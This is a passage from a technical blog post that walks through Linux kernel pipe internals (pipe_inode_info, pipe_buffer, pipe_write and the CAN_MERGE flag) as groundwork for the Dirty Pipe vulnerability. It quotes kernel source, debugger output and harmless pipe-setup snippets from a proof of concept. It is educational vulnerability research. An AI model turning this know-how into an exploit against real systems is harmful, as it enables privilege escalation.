&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1218">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>As stated above, an inode is not limited to describing pipes, and for other file types this field would point to another set of function pointers / implementations.&lt;/p>
&lt;p>The pipe-specific part of the inode is mostly contained in the &lt;code>struct pipe_inode_info&lt;/code> pointed to by the &lt;code>i_pipe&lt;/code> field.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * struct pipe_inode_info - a linux kernel pipe
&lt;/span>&lt;span style="color:#75715e"> * @mutex: mutex protecting the whole thing
&lt;/span>&lt;span style="color:#75715e"> * @rd_wait: reader wait point in case of empty pipe
&lt;/span>&lt;span style="color:#75715e"> * @wr_wait: writer wait point in case of full pipe
&lt;/span>&lt;span style="color:#75715e"> * @head: The point of buffer production
&lt;/span>&lt;span style="color:#75715e"> * @tail: The point of buffer consumption
&lt;/span>&lt;span style="color:#75715e"> * @note_loss: The next read() should insert a data-lost message
&lt;/span>&lt;span style="color:#75715e"> * @max_usage: The maximum number of slots that may be used in the ring
&lt;/span>&lt;span style="color:#75715e"> * @ring_size: total number of buffers (should be a power of 2)
&lt;/span>&lt;span style="color:#75715e"> * @nr_accounted: The amount this pipe accounts for in user-&amp;gt;pipe_bufs
&lt;/span>&lt;span style="color:#75715e"> * @tmp_page: cached released page
&lt;/span>&lt;span style="color:#75715e"> * @readers: number of current readers of this pipe
&lt;/span>&lt;span style="color:#75715e"> * @writers: number of current writers of this pipe
&lt;/span>&lt;span style="color:#75715e"> * @files: number of struct file referring this pipe (protected by -&amp;gt;i_lock)
&lt;/span>&lt;span style="color:#75715e"> * @r_counter: reader counter
&lt;/span>&lt;span style="color:#75715e"> * @w_counter: writer counter
&lt;/span>&lt;span style="color:#75715e"> * @poll_usage: is this pipe used for epoll, which has crazy wakeups?
&lt;/span>&lt;span style="color:#75715e"> * @fasync_readers: reader side fasync
&lt;/span>&lt;span style="color:#75715e"> * @fasync_writers: writer side fasync
&lt;/span>&lt;span style="color:#75715e"> * @bufs: the circular array of pipe buffers
&lt;/span>&lt;span style="color:#75715e"> * @user: the user who created this pipe
&lt;/span>&lt;span style="color:#75715e"> * @watch_queue: If this pipe is a watch_queue, this is the stuff for that
&lt;/span>&lt;span style="color:#75715e"> **/&lt;/span>
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info {
&lt;span style="color:#66d9ef">struct&lt;/span> mutex mutex;
wait_queue_head_t rd_wait, wr_wait;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> head;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> tail;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> max_usage;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> ring_size;
&lt;span style="color:#75715e">#ifdef CONFIG_WATCH_QUEUE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> note_loss;
&lt;span style="color:#75715e">#endif
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> nr_accounted;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> readers;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> writers;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> files;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> r_counter;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> w_counter;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> poll_usage;
&lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>tmp_page;
&lt;span style="color:#66d9ef">struct&lt;/span> fasync_struct &lt;span style="color:#f92672">*&lt;/span>fasync_readers;
&lt;span style="color:#66d9ef">struct&lt;/span> fasync_struct &lt;span style="color:#f92672">*&lt;/span>fasync_writers;
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer &lt;span style="color:#f92672">*&lt;/span>bufs;
&lt;span style="color:#66d9ef">struct&lt;/span> user_struct &lt;span style="color:#f92672">*&lt;/span>user;
&lt;span style="color:#75715e">#ifdef CONFIG_WATCH_QUEUE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> watch_queue &lt;span style="color:#f92672">*&lt;/span>watch_queue;
&lt;span style="color:#75715e">#endif
&lt;/span>&lt;span style="color:#75715e">&lt;/span>};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L58">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>At this point we can get a first idea of how pipes are implemented. On a high level, the kernel thinks of a pipe as a circular array of &lt;code>pipe_buffer&lt;/code> structures (sometimes also called a ring). The &lt;code>bufs&lt;/code> field is a pointer to the start of this array.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * struct pipe_buffer - a linux kernel pipe buffer
&lt;/span>&lt;span style="color:#75715e"> * @page: the page containing the data for the pipe buffer
&lt;/span>&lt;span style="color:#75715e"> * @offset: offset of data inside the @page
&lt;/span>&lt;span style="color:#75715e"> * @len: length of data inside the @page
&lt;/span>&lt;span style="color:#75715e"> * @ops: operations associated with this buffer. See @pipe_buf_operations.
&lt;/span>&lt;span style="color:#75715e"> * @flags: pipe buffer flags. See above.
&lt;/span>&lt;span style="color:#75715e"> * @private: private data owned by the ops.
&lt;/span>&lt;span style="color:#75715e"> **/&lt;/span>
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer {
&lt;span style="color:#66d9ef">struct&lt;/span> page &lt;span style="color:#f92672">*&lt;/span>page;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> offset, len;
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> pipe_buf_operations &lt;span style="color:#f92672">*&lt;/span>ops;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> flags;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> private;
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L26">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>There are two positions in this array: one for writing to (the &lt;code>head&lt;/code>) - and one for reading from (the &lt;code>tail&lt;/code>) the pipe. The &lt;code>ring_size&lt;/code> defaults to &lt;code>16&lt;/code> and will always be a power of 2, which is why circularity is implemented by masking index accesses with &lt;code>ring_size - 1&lt;/code> (e.g., &lt;code>bufs[head &amp;amp; (ring_size - 1)]&lt;/code>). The &lt;code>page&lt;/code> field is a pointer to a &lt;code>struct page&lt;/code> describing where the actual data held by the &lt;code>pipe_buffer&lt;/code> is stored. We will elaborate more on the process of adding and consuming data below. Note that each &lt;code>pipe_buffer&lt;/code> has one page associated which means that the total capacity of the pipe is &lt;code>ring_size * 4096 bytes (4KB)&lt;/code>.&lt;/p>
&lt;p>A process can get and set the size of this ring using the &lt;code>fcntl()&lt;/code> system call with the &lt;code>F_GETPIPE_SZ&lt;/code> and &lt;code>F_SETPIPE_SZ&lt;/code> flags, respectively. Our PoC sets the size of its pipe to a single buffer (4KB / one page) for simplicity.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span>
&lt;span style="color:#a6e22e">setup_pipe&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> pipefd_r, &lt;span style="color:#66d9ef">int&lt;/span> pipefd_w) {
&lt;span style="color:#66d9ef">if&lt;/span> (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) &lt;span style="color:#f92672">!=&lt;/span> PAGESIZE) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L48">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;h3 id="code">Code&lt;/h3>
&lt;p>We can also follow the setup of the pipe in the kernel source code. The initialization of the integer file descriptors happens in &lt;code>__do_pipe_flags()&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">__do_pipe_flags&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>fd, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">**&lt;/span>files, &lt;span style="color:#66d9ef">int&lt;/span> flags)
{
&lt;span style="color:#66d9ef">int&lt;/span> error;
&lt;span style="color:#66d9ef">int&lt;/span> fdw, fdr;
...
error &lt;span style="color:#f92672">=&lt;/span> create_pipe_files(files, flags);
...
fdr &lt;span style="color:#f92672">=&lt;/span> get_unused_fd_flags(flags);
...
fdw &lt;span style="color:#f92672">=&lt;/span> get_unused_fd_flags(flags);
...
audit_fd_pair(fdr, fdw);
fd[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> fdr;
fd[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> fdw;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L954">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The backing files are initialized in &lt;code>create_pipe_files()&lt;/code>. We can see that both files are identical up to permissions, contain a reference to the pipe in their private data, and are opened as &lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1423">streams&lt;/a>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">create_pipe_files&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">**&lt;/span>res, &lt;span style="color:#66d9ef">int&lt;/span> flags)
{
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode &lt;span style="color:#f92672">=&lt;/span> get_pipe_inode();
&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>f;
&lt;span style="color:#66d9ef">int&lt;/span> error;
...
f &lt;span style="color:#f92672">=&lt;/span> alloc_file_pseudo(inode, pipe_mnt, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>,
O_WRONLY &lt;span style="color:#f92672">|&lt;/span> (flags &lt;span style="color:#f92672">&amp;amp;&lt;/span> (O_NONBLOCK &lt;span style="color:#f92672">|&lt;/span> O_DIRECT)),
&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipefifo_fops);
...
f&lt;span style="color:#f92672">-&amp;gt;&lt;/span>private_data &lt;span style="color:#f92672">=&lt;/span> inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_pipe;
res[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> alloc_file_clone(f, O_RDONLY &lt;span style="color:#f92672">|&lt;/span> (flags &lt;span style="color:#f92672">&amp;amp;&lt;/span> O_NONBLOCK),
&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipefifo_fops);
...
res[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>private_data &lt;span style="color:#f92672">=&lt;/span> inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_pipe;
res[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> f;
stream_open(inode, res[&lt;span style="color:#ae81ff">0&lt;/span>]);
stream_open(inode, res[&lt;span style="color:#ae81ff">1&lt;/span>]);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L911">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>The initialization of the common inode structure happens in &lt;code>get_pipe_inode()&lt;/code>. We can see that an inode is created and also information for the pipe is allocated and stored such that &lt;code>inode-&amp;gt;i_pipe&lt;/code> can later be used to access the pipe from a given inode. Furthermore, &lt;code>inode-&amp;gt;i_fops&lt;/code> specifies the implementations used for file operations on a pipe.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">get_pipe_inode&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode &lt;span style="color:#f92672">=&lt;/span> new_inode_pseudo(pipe_mnt&lt;span style="color:#f92672">-&amp;gt;&lt;/span>mnt_sb);
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe;
...
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_ino &lt;span style="color:#f92672">=&lt;/span> get_next_ino();
pipe &lt;span style="color:#f92672">=&lt;/span> alloc_pipe_info();
...
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_pipe &lt;span style="color:#f92672">=&lt;/span> pipe;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>files &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>readers &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>writers &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_fop &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>pipefifo_fops; &lt;span style="color:#75715e">// lolcads: see description below
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * Mark the inode dirty from the very beginning,
&lt;/span>&lt;span style="color:#75715e"> * that way it will never be moved to the dirty
&lt;/span>&lt;span style="color:#75715e"> * list because &amp;#34;mark_inode_dirty()&amp;#34; will think
&lt;/span>&lt;span style="color:#75715e"> * that it already _is_ on the dirty list.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_state &lt;span style="color:#f92672">=&lt;/span> I_DIRTY;
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_mode &lt;span style="color:#f92672">=&lt;/span> S_IFIFO &lt;span style="color:#f92672">|&lt;/span> S_IRUSR &lt;span style="color:#f92672">|&lt;/span> S_IWUSR;
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_uid &lt;span style="color:#f92672">=&lt;/span> current_fsuid();
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_gid &lt;span style="color:#f92672">=&lt;/span> current_fsgid();
inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_atime &lt;span style="color:#f92672">=&lt;/span> inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_mtime &lt;span style="color:#f92672">=&lt;/span> inode&lt;span style="color:#f92672">-&amp;gt;&lt;/span>i_ctime &lt;span style="color:#f92672">=&lt;/span> current_time(inode);
&lt;span style="color:#66d9ef">return&lt;/span> inode;
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L871">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>Most of the pipe-specific setup happens is &lt;code>alloc_pipe_info()&lt;/code>. Here you can see the actual creation of the pipe, not just the inode, but the &lt;code>pipe_buffer&lt;/code>s / &lt;code>pipe_inode_info-&amp;gt;bufs&lt;/code> that hold the content / data of the pipe.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">alloc_pipe_info&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info &lt;span style="color:#f92672">*&lt;/span>pipe;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> pipe_bufs &lt;span style="color:#f92672">=&lt;/span> PIPE_DEF_BUFFERS; &lt;span style="color:#75715e">// lolcads: defaults to 16
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> user_struct &lt;span style="color:#f92672">*&lt;/span>user &lt;span style="color:#f92672">=&lt;/span> get_current_user();
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> user_bufs;
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> max_size &lt;span style="color:#f92672">=&lt;/span> READ_ONCE(pipe_max_size);
&lt;span style="color:#75715e">// lolcads: allocate the inode info
&lt;/span>&lt;span style="color:#75715e">&lt;/span> pipe &lt;span style="color:#f92672">=&lt;/span> kzalloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pipe_inode_info), GFP_KERNEL_ACCOUNT);
...
&lt;span style="color:#75715e">// lolcads: allocate the buffers with the page references
&lt;/span>&lt;span style="color:#75715e">&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs &lt;span style="color:#f92672">=&lt;/span> kcalloc(pipe_bufs, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> pipe_buffer),
GFP_KERNEL_ACCOUNT);
&lt;span style="color:#66d9ef">if&lt;/span> (pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>bufs) { &lt;span style="color:#75715e">// lolcads: set up the rest of the relevant fields
&lt;/span>&lt;span style="color:#75715e">&lt;/span> init_waitqueue_head(&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>rd_wait);
init_waitqueue_head(&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>wr_wait);
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>r_counter &lt;span style="color:#f92672">=&lt;/span> pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>w_counter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>max_usage &lt;span style="color:#f92672">=&lt;/span> pipe_bufs;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ring_size &lt;span style="color:#f92672">=&lt;/span> pipe_bufs;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>nr_accounted &lt;span style="color:#f92672">=&lt;/span> pipe_bufs;
pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>user &lt;span style="color:#f92672">=&lt;/span> user;
mutex_init(&lt;span style="color:#f92672">&amp;amp;&lt;/span>pipe&lt;span style="color:#f92672">-&amp;gt;&lt;/span>mutex);
&lt;span style="color:#66d9ef">return&lt;/span> pipe;
}
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L782">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;h3 id="debugger">Debugger&lt;/h3>
&lt;p>We can print a summary of the freshly initialized pipe (after resizing it) by breaking at the end of &lt;code>pipe_fcntl()&lt;/code>, which is the handler invoked in the &lt;code>case F_SETPIPE_SZ:&lt;/code> of the switch statement inside &lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1392">&lt;code>do_fcntl()&lt;/code>&lt;/a>.&lt;/p>
&lt;pre tabindex="0">&lt;code>struct pipe_inode_info at 0xffff8881044aec00
&amp;gt; 'head': 0
&amp;gt; 'tail': 0
&amp;gt; 'ring_size': 1
&amp;gt; 'bufs': 0xffff888101f8a180
struct pipe_buffer at 0xffff888101f8a180
&amp;gt; 'page': NULL
&amp;gt; 'offset': 0
&amp;gt; 'len': 0
&amp;gt; 'ops': NULL
&amp;gt; 'flags':
&lt;/code>&lt;/pre>&lt;p>There&amp;rsquo;s not much to see yet, but we keep this as a reference to see how things evolve over time.&lt;/p>
&lt;h2 id="pipes-readingwriting">Pipes (reading/writing)&lt;/h2>
&lt;h3 id="writing">Writing&lt;/h3>
&lt;p>After allocating the pipe, the PoC proceeds by writing to it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span>
&lt;span style="color:#a6e22e">fill_pipe&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> pipefd_w) {
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> PAGESIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to perform first write() to pipe&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">==&lt;/span> PAGESIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
pause_for_inspection(&lt;span style="color:#e6db74">&amp;#34;About to perform last write() to pipe&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">if&lt;/span> (write(pipefd_w, &lt;span style="color:#e6db74">&amp;#34;AAAAAAAA&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
exit(&lt;span style="color:#ae81ff">1&lt;/span>);
}
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L18">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>By looking at the file operations of a pipe inode we can see that &lt;code>write&lt;/code>s to a pipe are handled by &lt;code>pipe_write()&lt;/code>. When data is moved across the kernel-user-space boundary (or within the kernel) one frequently encounters vectorized I/O using &lt;a href="https://lwn.net/Articles/625077/">&lt;code>iov_iter&lt;/code>&lt;/a> objects. For our purposes we can think of them as buffers but feel free to follow the links to learn more (also &lt;a href="https://en.wikipedia.org/wiki/Vectored_I/O">this&lt;/a>).&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-c=" data-lang="c=">static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
struct file *filp = iocb-&amp;gt;ki_filp;
struct pipe_inode_info *pipe = filp-&amp;gt;private_data;
unsigned int head;
ssize_t ret = 0;
size_t total_len = iov_iter_count(from);
ssize_t chars;
bool was_empty = false;
...
/*
* If it wasn't empty we try to merge new data into
* the last buffer.
*
* That naturally merges small writes, but it also
* page-aligns the rest of the writes for large writes
* spanning multiple pages.
*/
head = pipe-&amp;gt;head;
was_empty = pipe_empty(head, pipe-&amp;gt;tail);
chars = total_len &amp;amp; (PAGE_SIZE-1);
if (chars &amp;amp;&amp;amp; !was_empty) {
unsigned int mask = pipe-&amp;gt;ring_size - 1;
struct pipe_buffer *buf = &amp;amp;pipe-&amp;gt;bufs[(head - 1) &amp;amp; mask];
int offset = buf-&amp;gt;offset + buf-&amp;gt;len;
if ((buf-&amp;gt;flags &amp;amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;amp;&amp;amp;
offset + chars &amp;lt;= PAGE_SIZE) {
...
ret = copy_page_from_iter(buf-&amp;gt;page, offset, chars, from);
...
buf-&amp;gt;len += ret;
if (!iov_iter_count(from))
goto out;
}
}
for (;;) {
...
head = pipe-&amp;gt;head;
if (!pipe_full(head, pipe-&amp;gt;tail, pipe-&amp;gt;max_usage)) {
unsigned int mask = pipe-&amp;gt;ring_size - 1;
struct pipe_buffer *buf = &amp;amp;pipe-&amp;gt;bufs[head &amp;amp; mask];
struct page *page = pipe-&amp;gt;tmp_page;
int copied;
if (!page) {
page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
...
pipe-&amp;gt;tmp_page = page;
}
/* Allocate a slot in the ring in advance and attach an
* empty buffer. If we fault or otherwise fail to use
* it, either the reader will consume it or it'll still
* be there for the next write.
*/
spin_lock_irq(&amp;amp;pipe-&amp;gt;rd_wait.lock);
head = pipe-&amp;gt;head;
if (pipe_full(head, pipe-&amp;gt;tail, pipe-&amp;gt;max_usage)) {
spin_unlock_irq(&amp;amp;pipe-&amp;gt;rd_wait.lock);
continue;
}
pipe-&amp;gt;head = head + 1;
spin_unlock_irq(&amp;amp;pipe-&amp;gt;rd_wait.lock);
/* Insert it into the buffer array */
buf = &amp;amp;pipe-&amp;gt;bufs[head &amp;amp; mask];
buf-&amp;gt;page = page;
buf-&amp;gt;ops = &amp;amp;anon_pipe_buf_ops;
buf-&amp;gt;offset = 0;
buf-&amp;gt;len = 0;
if (is_packetized(filp))
buf-&amp;gt;flags = PIPE_BUF_FLAG_PACKET;
else
buf-&amp;gt;flags = PIPE_BUF_FLAG_CAN_MERGE;
pipe-&amp;gt;tmp_page = NULL;
copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
...
ret += copied;
buf-&amp;gt;offset = 0;
buf-&amp;gt;len = copied;
if (!iov_iter_count(from))
break;
}
if (!pipe_full(head, pipe-&amp;gt;tail, pipe-&amp;gt;max_usage))
continue;
...
}
out:
...
return ret;
}
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L416">&lt;code>⬀ go to source code&lt;/code>&lt;/a>&lt;/p>
&lt;p>When handling a &lt;code>write()&lt;/code> to a pipe, the kernel differentiates between two cases. First it checks if it can append (at least a part of) the data to &lt;code>page&lt;/code> of the &lt;code>pipe_buffer&lt;/code> that is currently the &lt;code>head&lt;/code> of the ring. Whether or not this is possible is decided by three things:&lt;/p>
&lt;ul>
&lt;li>is the pipe non-empty when we start writing? (implies that there are initialized buffers available)
&lt;code>!was_empty&lt;/code>&lt;/li>
&lt;li>is the &lt;code>PIPE_BUF_FLAG_CAN_MERGE&lt;/code> flag set?
&lt;code>buf-&amp;gt;flags &amp;amp; PIPE_BUF_FLAG_CAN_MERGE&lt;/code>&lt;/li>
&lt;li>is there is enough space left on the page?
&lt;code>offset + chars &amp;lt;= PAGE_SIZE&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>If the answer to all of those questions is &lt;em>yes&lt;/em> the kernel starts the write by appending to the existing page.&lt;/p>
